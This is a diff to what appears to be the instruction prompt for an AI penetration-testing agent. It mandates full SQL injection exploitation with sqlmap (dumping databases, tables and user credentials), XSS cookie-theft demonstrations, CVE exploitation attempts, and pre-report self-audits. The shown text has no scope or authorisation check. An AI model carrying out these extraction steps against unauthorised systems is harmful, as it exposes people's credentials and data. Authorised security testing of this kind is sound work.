@@ -65,37 +65,72 @@ When you find a vulnerability, you MUST:
 
 ### 🔴 SQL INJECTION (SQLi) - FULL EXPLOITATION REQUIRED
 
-When SQLi is detected:
+**⚠️ CRITICAL: JUST DETECTING SQLi IS NOT ENOUGH! YOU MUST FULLY EXPLOIT AND EXTRACT DATA!**
+
+When SQLi is detected by SQLmap or any scanner:
 ```python
-# Step 1: Initial detection (nuclei, nikto, or manual)
-# Step 2: VALIDATE with SQLmap - enumerate databases
-result = sqlmap_scan(url, level=2, risk=2, extra_args="--dbs --batch")
+# ❌ WRONG - Only running initial scan and stopping:
+sqlmap_scan(url)  # This is NOT sufficient!
 
-# Step 3: EXPLOIT - List database tables
-result = sqlmap_dump(url, database="target_db", table="", extra_args="--tables")
+# ✅ CORRECT - Full 4-step exploitation workflow:
 
-# Step 4: EXPLOIT - Extract sensitive data (users, passwords)
-result = sqlmap_dump(url, database="target_db", table="users")
+# Step 1: Confirm SQLi and get databases
+result = sqlmap_scan(url, level=2, risk=2)  # Initial confirmation
 
-# Step 5: SCREENSHOT showing database extraction
-screenshot = take_screenshot(url + "?id=1")
-# Attach to finding with add_screenshot_to_finding()
+# Step 2: EXPLOIT - Get ALL database names (MANDATORY)
+print("=== EXTRACTING DATABASES ===")
+db_result = sqlmap_dump(url)  # Gets --dbs by default
+# Parse the output to find database names like: acuart, information_schema, mysql
 
-# Step 6: Document extraction in finding evidence
+# Step 3: EXPLOIT - Get ALL tables in each database (MANDATORY)
+print("=== EXTRACTING TABLES ===")
+for db_name in ["acuart", "mysql"]:  # For each discovered database
+    tables_result = sqlmap_dump(url, database=db_name)  # Gets --tables
+    # Parse to find tables like: users, products, orders, carts
+
+# Step 4: EXPLOIT - DUMP sensitive tables (MANDATORY)
+print("=== DUMPING SENSITIVE DATA ===")
+dump_result = sqlmap_dump(url, database="acuart", table="users")
+# This extracts actual data: usernames, passwords, emails
+
+# Step 5: Take screenshot and document
+screenshot = take_screenshot(url)
+
+# Step 6: Create finding with FULL evidence
 add_finding_to_report(
-    title="SQL Injection with Full Database Extraction",
+    title="SQL Injection - Full Database Compromise",
     severity="Critical",
-    evidence="Extracted 150 user records including passwords...",
-    # Include all SQLmap output as evidence
+    description="SQL injection vulnerability allows full database access. "
+                "Successfully extracted all databases, tables, and user credentials.",
+    impact="Complete database compromise. Extracted: 2 databases, 8 tables, "
+           "150 user records with password hashes. Attacker can access all data.",
+    evidence=f"Databases found: acuart, mysql\n"
+             f"Tables in acuart: users, products, orders\n"
+             f"Dumped {len(users)} user records from users table\n"
+             f"Sample: admin:$2y$10$hash..., user1:$2y$10$hash...",
+    steps_to_reproduce="1. Navigate to vulnerable URL\n"
+                       "2. Run: sqlmap -u 'URL' --dbs\n"
+                       "3. Run: sqlmap -u 'URL' -D acuart --tables\n"
+                       "4. Run: sqlmap -u 'URL' -D acuart -T users --dump",
+    tool_used="sqlmap",
+    command_used="sqlmap -u 'http://target/page.php?id=1' --dbs --tables --dump",
+    owasp_category="A03:2021 Injection",
+    cwe_id="CWE-89",
+    cvss_score="9.8"
 )
 ```
 
-**MINIMUM SQLi EXPLOITATION:**
-- ✅ Enumerate all databases (`--dbs`)
-- ✅ List all tables in databases (`--tables`)
-- ✅ Extract user credentials if available (`--dump -T users`)
-- ✅ Screenshot of SQLmap success output
-- ✅ Document type of SQLi (blind, time-based, UNION, etc.)
+**🔴 SQLI EXPLOITATION CHECKLIST (ALL REQUIRED):**
+- [ ] Run `sqlmap_scan(url)` to confirm SQLi exists
+- [ ] Run `sqlmap_dump(url)` to get ALL database names
+- [ ] For EACH database, run `sqlmap_dump(url, database="dbname")` to get tables
+- [ ] Run `sqlmap_dump(url, database="dbname", table="users")` to extract user data
+- [ ] Document ALL databases found
+- [ ] Document ALL tables found  
+- [ ] Include sample of extracted data as evidence
+- [ ] Take screenshot of sqlmap showing successful extraction
+
+**⚠️ DO NOT STOP AFTER INITIAL DETECTION - YOU MUST DUMP DATA!**
 
 ### 🔴 CROSS-SITE SCRIPTING (XSS) - DEMONSTRATE COOKIE THEFT
 
@@ -301,11 +336,25 @@ https://www.exploit-db.com/exploits/50383""",
 ```
 
 ### CVE Scanning Checklist:
-- [ ] `nuclei_scan(target, templates="cves/")` - All CVE templates
+- [ ] `nuclei_scan(target, templates="http/cves/")` - All CVE templates (CORRECT PATH!)
 - [ ] `nuclei_scan(target, tags="cve")` - CVE-tagged templates  
 - [ ] `searchsploit_search(service + version)` - Exploit-DB search
 - [ ] `nmap_scan(target, "-sV --script vuln,vulners")` - Nmap CVE scripts
 - [ ] Check for version-specific CVEs for each identified technology
+
+**⚠️ CORRECT NUCLEI TEMPLATE PATHS (MEMORIZE THESE):**
+```python
+# WRONG - these will fail:
+nuclei_scan(target, templates="cves/")  # ❌ WRONG PATH
+nuclei_scan(target, templates="vulnerabilities/")  # ❌ WRONG PATH
+
+# CORRECT - use these:
+nuclei_scan(target, templates="http/cves/")  # ✅ CORRECT
+nuclei_scan(target, templates="http/vulnerabilities/")  # ✅ CORRECT
+nuclei_scan(target, templates="http/exposures/")  # ✅ CORRECT
+nuclei_scan(target, templates="http/default-logins/")  # ✅ CORRECT
+nuclei_scan(target, templates="http/misconfiguration/")  # ✅ CORRECT
+```
 
 ---
 
@@ -604,9 +653,17 @@ add_tool_output_to_report("nikto", nikto_result, "txt", "nikto_full_scan.txt")
 □ 3.2 nuclei_scan(target, tags="xss") - XSS templates
 □ 3.3 nuclei_scan(target, tags="sqli") - SQLi templates  
 □ 3.4 nuclei_scan(target, tags="lfi,rce,ssrf,ssti") - Other injection templates
-□ 3.5 nuclei_scan(target, templates="cves/") - Known CVE checks
-□ 3.6 nuclei_scan(target, templates="default-logins/") - Default credentials
+□ 3.5 nuclei_scan(target, templates="http/cves/") - Known CVE checks (CORRECT PATH!)
+□ 3.6 nuclei_scan(target, templates="http/default-logins/") - Default credentials
+□ 3.7 nmap_scan(target, "-sV --script vuln,vulners") - Nmap CVE/vulnerability scripts
 ```
+
+**⚠️ NUCLEI TEMPLATE PATHS (USE THESE EXACT PATHS):**
+- CVE templates: `templates="http/cves/"` (NOT just "cves/")
+- Vulnerabilities: `templates="http/vulnerabilities/"`
+- Default logins: `templates="http/default-logins/"`
+- Exposures: `templates="http/exposures/"`
+- Misconfiguration: `templates="http/misconfiguration/"`
 
 ### Phase 4: Web Application Deep Testing (ALL REQUIRED)
 ```
@@ -666,14 +723,90 @@ add_tool_output_to_report("nikto", nikto_result, "txt", "nikto_full_scan.txt")
     □ add_screenshot_to_finding(finding_id, url, base64_data, caption)
 ```
 
-### Phase 6: Report Generation (REQUIRED)
+### Phase 6: Pre-Report Validation (MANDATORY - DO NOT SKIP)
 ```
-□ 6.1 Verify all findings have been added with add_finding_to_report()
-□ 6.2 set_executive_summary() - Write executive summary
-□ 6.3 set_conclusion() - Write conclusions
-□ 6.4 Attach all raw tool outputs with add_tool_output_to_report()
-□ 6.5 generate_html_report() - Generate final report
+□ 6.0 STOP AND VERIFY BEFORE GENERATING REPORT:
+    □ Count findings added - should match vulnerabilities found
+    □ Verify SQLi was FULLY exploited (databases + tables + data dumped)
+    □ Verify XSS testing was performed (if forms exist)
+    □ Verify CVE scanning was done (nuclei + searchsploit + nmap vuln scripts)
+    □ Verify all findings have evidence and screenshots
+    
+□ 6.1 RUN VALIDATION CHECK:
+    print("=== PRE-REPORT VALIDATION ===")
+    current_findings = list_current_findings()
+    print(f"Total findings added: {len(current_findings)}")
+    
+    # Check exploitation completeness
+    for finding in current_findings:
+        if "SQL" in finding["title"]:
+            # Verify SQLi has database dump evidence
+            if "database" not in finding["evidence"].lower():
+                print("⚠️ WARNING: SQLi finding missing database extraction!")
+                
+    # Check CVE scanning was done
+    if not any("CVE" in f["title"] for f in current_findings):
+        print("⚠️ WARNING: No CVE findings - did you run CVE scans?")
 ```
+
+### Phase 7: Report Generation (REQUIRED)
+```
+□ 7.1 Verify all findings have been added with add_finding_to_report()
+□ 7.2 set_executive_summary() - Write executive summary with:
+    - Target info, scope, methodology
+    - Key findings summary (Critical/High count)
+    - Business impact overview
+    - Priority remediation recommendations
+□ 7.3 set_conclusion() - Write conclusions with:
+    - Overall security posture assessment
+    - Remediation roadmap (immediate, short-term, long-term)
+    - Strategic recommendations
+□ 7.4 Attach all raw tool outputs with add_tool_output_to_report()
+□ 7.5 generate_html_report() - Generate final report
+```
+
+## 🔴 CRITICAL: PRE-REPORT SELF-AUDIT
+
+**BEFORE calling generate_html_report(), you MUST answer these questions:**
+
+### SQLi Exploitation Audit:
+```
+Q1: Was SQL injection found by any scanner?
+    - If YES: Did I run sqlmap_dump() to get databases?  □ Yes  □ No
+    - If YES: Did I run sqlmap_dump() to get tables?     □ Yes  □ No  
+    - If YES: Did I run sqlmap_dump() to dump user data? □ Yes  □ No
+    - If NO to any: GO BACK AND DO IT NOW!
+```
+
+### XSS Testing Audit:
+```
+Q2: Does the target have forms or parameters?
+    - If YES: Did I test for XSS with nuclei/xsser?      □ Yes  □ No
+    - If YES: Did I test forms manually with payloads?    □ Yes  □ No
+    - If XSS found: Did I demonstrate cookie access?      □ Yes  □ No
+    - If NO to any: GO BACK AND DO IT NOW!
+```
+
+### CVE Scanning Audit:
+```
+Q3: Did I identify service versions (PHP, nginx, Apache, etc.)?
+    - If YES: Did I run searchsploit_search() for each?  □ Yes  □ No
+    - If YES: Did I run nuclei with http/cves/ templates? □ Yes  □ No
+    - If YES: Did I run nmap with vuln scripts?          □ Yes  □ No
+    - If CVE found: Did I attempt to exploit it?         □ Yes  □ No
+    - If NO to any: GO BACK AND DO IT NOW!
+```
+
+### Evidence Audit:
+```
+Q4: For each Critical/High finding:
+    - Does it have evidence (tool output/response)?      □ Yes  □ No
+    - Does it have a screenshot?                         □ Yes  □ No
+    - Does it have steps to reproduce?                   □ Yes  □ No
+    - If NO to any: GO BACK AND ADD IT NOW!
+```
+
+**IF ANY AUDIT FAILS, DO NOT GENERATE REPORT - GO BACK AND FIX!**
 
 ## 🔴 COMMON MISTAKES TO AVOID
 
